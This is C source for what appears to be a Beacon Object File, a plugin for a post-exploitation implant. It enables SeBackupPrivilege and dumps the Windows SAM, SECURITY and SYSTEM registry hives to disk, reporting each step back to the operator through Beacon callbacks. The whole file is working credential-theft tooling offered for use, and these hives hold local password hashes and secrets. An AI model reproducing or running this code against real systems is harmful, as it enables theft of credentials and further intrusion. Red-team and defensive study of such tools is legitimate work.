#include <windows.h>
#include "bofdefs.h"

#define UNLEN 256
#define MAX_PATH 260

BOOL SetBackupPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPCSTR lpwPriv = "SeBackupPrivilege";
	if (!LookupPrivilegeValueA(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

BOOL FileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void dump_reg(LPSTR path)
{
	HKEY hKey = 0x0;
	char path_buffer[MAX_PATH];
	
	//dump sam
	LPCSTR lpSubKey = "SAM";
	LPCSTR lpFile = PathCombineA(path_buffer, path, "sam.save");
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20019, &hKey);

	//Check file exist
	if (FileExists(lpFile)) {
		DeleteFileA(lpFile);
		BeaconPrintf(CALLBACK_OUTPUT, "[!] %s already exists. Delete it now\n", lpFile);
	}
	RegSaveKeyA(hKey, lpFile, 0x0);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] SAM save in -> %s\n", lpFile);
	RegCloseKey(hKey);

	hKey = 0x0;

	//dump security
	lpSubKey = "SECURITY";

	ZeroMemory(path_buffer, sizeof(path_buffer));
	lpFile = PathCombineA(path_buffer, path, "security.save");
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20019, &hKey);

	if (FileExists(lpFile)) {
		DeleteFileA(lpFile);
		BeaconPrintf(CALLBACK_OUTPUT, "[!] %s already exists. Delete it now\n", lpFile);
	}
	RegSaveKeyA(hKey, lpFile, 0x0);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] SECURITY save in -> %s\n", lpFile);

	RegCloseKey(hKey);

	hKey = 0x0;

	//dump system
	lpSubKey = "SYSTEM";

	ZeroMemory(path_buffer, sizeof(path_buffer));
	lpFile = PathCombineA(path_buffer, path, "system.save");
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20019, &hKey);
	if (FileExists(lpFile)) {
		DeleteFileA(lpFile);
		BeaconPrintf(CALLBACK_OUTPUT, "[!] %s already exists. Delete it now\n", lpFile);
	}
	RegSaveKeyA(hKey, lpFile, 0x0);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM save in -> %s\n", lpFile);
	RegCloseKey(hKey);

}


#ifdef BOF
void go(char* args, int len) {

	if (!BeaconIsAdmin()) {
		BeaconPrintf(CALLBACK_ERROR, "You must be a admin for this to work.\n");
		return;
	}
	if (!SetBackupPrivilege()) {
		BeaconPrintf(CALLBACK_ERROR, "SeBackupPrivilege has been failed.\n");
		return;
	}

	LPSTR path;
	datap parser;
	BeaconDataParse(&parser, args, len);
	path = BeaconDataExtract(&parser, 0);

	if (!PathIsDirectoryA(path)) {
		BeaconPrintf(CALLBACK_ERROR, "Invalid path passed.\n");
		return;
	}
	dump_reg(path);
	BeaconPrintf(CALLBACK_OUTPUT, "[*] Finished. Sam, System and Security dumped to %s\n", path);

}


#else

void main(int argc, char* argv[]) {

}

#endif